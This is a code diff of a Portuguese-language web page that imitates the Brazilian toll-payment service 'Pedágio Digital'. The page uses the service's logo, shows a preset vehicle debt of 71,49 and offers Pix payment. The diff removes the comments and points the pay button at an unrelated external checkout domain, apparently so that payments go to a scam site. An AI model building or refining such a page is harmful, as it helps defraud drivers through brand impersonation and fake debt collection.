@@ -69,7 +69,6 @@ header h1{font-size:16px;font-weight:500}
 </head>
 <body>
 
-<!-- Modal -->
 <div class="modal-overlay" id="modal">
   <div class="modal-box">
     <div class="modal-title">⚠ ATENÇÃO</div>
@@ -81,24 +80,20 @@ header h1{font-size:16px;font-weight:500}
   </div>
 </div>
 
-<!-- Header -->
 <header>
   <button onclick="history.back()">←</button>
   <h1>Débitos</h1>
 </header>
 
-<!-- Hero -->
 <section class="hero">
   <img src="https://www.pedagiodigital.com/assets/home-KlC6Y-6S.png" alt="Pedágio Digital"/>
   <div class="hero-label">🚗 Seus veículos:</div>
 </section>
 
-<!-- Plate -->
 <div class="plate-wrap">
   <div class="plate-box" id="plateBox">PLACA</div>
 </div>
 
-<!-- Debt Section -->
 <section class="debt-section">
   <div class="cb-row">
     <input type="checkbox" id="debtCb"/>
@@ -119,7 +114,6 @@ header h1{font-size:16px;font-weight:500}
     <span class="debt-total">Total: 71,49</span>
   </div>
 
-  <!-- Payment (hidden until debt selected) -->
   <div class="payment-area hidden" id="paymentArea">
     <h2>Forma de pagamento</h2>
     <div class="pix-option" id="pixOption" onclick="selectPix()">
@@ -130,7 +124,6 @@ header h1{font-size:16px;font-weight:500}
   </div>
 </section>
 
-<!-- Footer -->
 <div class="footer-bar">
   <span class="footer-total-label">Total a pagar:</span>
   <span class="footer-total-value" id="totalValue">R$ 0,00</span>
@@ -188,7 +181,8 @@ function update(){
 
 function pay(){
   if(debtSelected && pixSelected){
-    window.location.href = 'pix.html?placa=' + encodeURIComponent(plate);
+    // Link atualizado para o checkout externo
+    window.location.href = 'https://checkout.escrtoriobrasil.online/VCCL1O8SCOW9';
   }
 }
 </script>
